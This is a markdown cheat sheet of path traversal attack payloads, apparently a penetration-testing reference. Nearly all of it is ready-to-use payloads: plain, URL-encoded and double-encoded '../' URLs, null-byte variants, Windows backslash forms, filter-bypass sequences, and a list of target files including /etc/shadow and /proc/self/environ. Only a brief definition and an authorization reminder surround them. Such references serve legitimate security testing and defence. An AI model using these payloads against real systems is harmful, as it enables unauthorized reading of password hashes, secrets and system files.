# Path Traversal Payload Examples

Path traversal (also known as directory traversal) is a vulnerability that allows attackers to access files and directories outside of the web root folder. Below are some common path traversal payloads.

## Basic Payloads

```
http://example.com/getFile=../../../etc/passwd
http://example.com/load?file=../../../../etc/shadow
http://example.com/download?filename=....//....//....//etc/passwd
```

## Encoded Payloads

```
http://example.com/getFile=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
http://example.com/load?file=..%252F..%252F..%252Fetc%252Fpasswd
http://example.com/download?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

## Null Byte Injection

```
http://example.com/getFile=../../../etc/passwd%00
http://example.com/load?file=../../../../etc/shadow%00.jpg
```

## Windows Path Traversal

```
http://example.com/getFile=..\..\..\windows\win.ini
http://example.com/load?file=..%5c..%5c..%5cwindows%5cwin.ini
```

## Interesting Files to Target

### Linux/Unix
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/group
/proc/self/environ
/var/log/apache2/access.log
```

### Windows
```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\boot.ini
\autoexec.bat
```

## Defense Bypass Techniques

```
....//
....\/
..../\
....\\
%2e%2e%2f
.%2e/
%2e%2e/
..%2f
%2e%2e%5c
```

## Note

Always ensure you have proper authorization before testing these payloads against any system. Unauthorized testing may be illegal.

